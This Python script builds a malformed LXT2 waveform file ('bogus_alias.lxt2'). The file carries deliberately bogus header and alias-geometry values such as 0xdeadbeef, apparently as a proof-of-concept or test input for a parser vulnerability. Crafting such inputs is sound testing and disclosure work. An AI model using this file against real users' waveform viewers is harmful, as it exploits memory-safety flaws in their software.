import gzip
import struct

output = b''

#####

# names
fac_names = b''

fac_names += struct.pack(">H", 0)   # offset
fac_names += b'test\x00'
fac_names += struct.pack(">H", 0)   # offset
fac_names += b'test2\x00'
fac_names += struct.pack(">H", 0)   # offset
fac_names += b'alias\x00'

#####

# geometry
fac_geom = b''

fac_geom += struct.pack(">IIII", 0, 7, 0, 0)
fac_geom += struct.pack(">IIII", 0, 7, 0, 0)
fac_geom += struct.pack(">IIII", 0xdeadbeef, 3, 0, 8)

#####

# header
output += struct.pack('>H', 0x1380)     # hdrid
output += struct.pack('>H', 0x0001)     # version
output += struct.pack('>B', 64)         # granule size

output += struct.pack(">I", 3)              # numfacs
output += struct.pack(">I", 0xdeadbeef)     # numfacbytes
output += struct.pack(">I", 100)            # longestname
output += struct.pack(">I", len(fac_names)) # zfacnamesize
output += struct.pack(">I", len(fac_names)) # zfacname_predec_size
output += struct.pack(">I", len(fac_geom))  # zfacgeometrysize
output += struct.pack(">b", -9)             # timescale

output += fac_names
output += fac_geom

#####

# block
block_data = b''

block_data += b'\x00'                   # LXT2_RD_GRAN_SECT_TIME
block_data += struct.pack(">B", 3)      # num_time_table_entries
block_data += struct.pack(">Q", 5)
block_data += struct.pack(">Q", 10)
block_data += struct.pack(">Q", 15)
block_data += struct.pack(">B", 1)      # fac_map_index_width
block_data += struct.pack(">B", 0)
block_data += struct.pack(">B", 1)
block_data += struct.pack(">B", 1)      # fac_curpos_width
block_data += b'\x00'
block_data += b'\x0f'
block_data += b'\x01'
block_data += b'\x10'

block_data += b'\x01'                   # LXT2_RD_GRAN_SECT_DICT
# dict
dict_data = b''
block_data += dict_data
# map
block_data += struct.pack(">Q", 0b101)
block_data += struct.pack(">Q", 0b011)
block_data += struct.pack(">I", 0)              # num_dict_entries
block_data += struct.pack(">I", len(dict_data)) # dict_size
block_data += struct.pack(">I", 2)              # num_map_entries

# it is not actually possible to not compress this
# or else it will be read as a striped file
block_compr = gzip.compress(block_data)

output += struct.pack(">IIQQ",
                      len(block_data),  # uncompressed size
                      len(block_compr), # compressed size
                      0,                # start time
                      100)              # end time
output += block_compr

#####

with open('bogus_alias.lxt2', 'wb') as f:
    f.write(output)
